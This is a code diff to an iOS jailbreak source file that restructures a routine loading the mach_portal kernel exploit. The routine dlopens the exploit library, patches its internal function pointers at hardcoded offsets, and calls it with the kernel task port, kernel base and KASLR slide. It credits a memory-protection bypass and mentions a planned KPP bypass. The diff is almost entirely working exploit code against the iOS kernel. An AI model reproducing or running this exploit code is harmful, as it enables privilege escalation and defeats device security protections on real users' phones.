@@ -7,6 +7,7 @@
 //
 
 #include "unjail.h"
+#include "offsets.h"
 
 static int
 my_IOConnectTrap4(int conn, long unused, uint64_t x1, uint64_t x2, uint64_t x0, uint64_t func)
@@ -76,37 +77,42 @@ unjail2(uint64_t surfacevt)
 {
     void *h;
     int rv;
-    Dl_info info;
-    void (*x)(void *button, mach_port_t tfp0, uint64_t kernel_base, uint64_t allprocs, mach_port_t real_service_port, mach_port_t mitm_port);
 
-    // @qwertyoruiop's memprot bypass
+    if (mp) {
+        Dl_info info;
+        void (*x)(void *button, mach_port_t tfp0, uint64_t kernel_base, uint64_t allprocs, mach_port_t real_service_port, mach_port_t mitm_port);
 
-    h = dlopen("@executable_path/mach_portal", RTLD_NOW | RTLD_LOCAL);
-    if (!h) {
-        printf("err: %s\n", dlerror());
-        return -1;
+        // @qwertyoruiop's memprot bypass
+
+        h = dlopen(mp, RTLD_NOW | RTLD_LOCAL);
+        if (!h) {
+            printf("err: %s\n", dlerror());
+            return ERR_INTERNAL;
+        }
+
+        x = (void (*)())dlsym(h, "exploit");
+        if (!x) {
+            printf("err: %s\n", dlerror());
+            dlclose(h);
+            return ERR_INTERNAL;
+        }
+
+        rv = dladdr((void *)x, &info);
+        if (!rv) {
+            printf("err: %s\n", dlerror());
+            dlclose(h);
+            return ERR_INTERNAL;
+        }
+
+        *(void **)((char *)info.dli_fbase + 0x1C1B8) = (void *)affine_const_by_surfacevt;   // accept
+        *(void **)((char *)info.dli_fbase + 0x1C258) = (void *)constload;                   // listen
+        *(void **)((char *)info.dli_fbase + 0x1C3B8) = (void *)constget;                    // socket
+        *(void **)((char *)info.dli_fbase + 0x1C0C0) = (void *)my_IOConnectTrap4;
+
+        x(NULL, tfp0, kernel_base, kaslr_shift, (mach_port_t)surfacevt, -1);
+    } else {
+        return ERR_UNSUPPORTED_YET; // TODO: remove after writing KPP bypass
     }
-
-    x = (void (*)())dlsym(h, "exploit");
-    if (!x) {
-        printf("err: %s\n", dlerror());
-        dlclose(h);
-        return -1;
-    }
-
-    rv = dladdr((void *)x, &info);
-    if (!rv) {
-        printf("err: %s\n", dlerror());
-        dlclose(h);
-        return -1;
-    }
-
-    *(void **)((char *)info.dli_fbase + 0x1C1B8) = (void *)affine_const_by_surfacevt;   // accept
-    *(void **)((char *)info.dli_fbase + 0x1C258) = (void *)constload;                   // listen
-    *(void **)((char *)info.dli_fbase + 0x1C3B8) = (void *)constget;                    // socket
-    *(void **)((char *)info.dli_fbase + 0x1C0C0) = (void *)my_IOConnectTrap4;
-
-    x(NULL, tfp0, kernel_base, kaslr_shift, (mach_port_t)surfacevt, -1);
 
     if (1) {
         struct utsname uts;
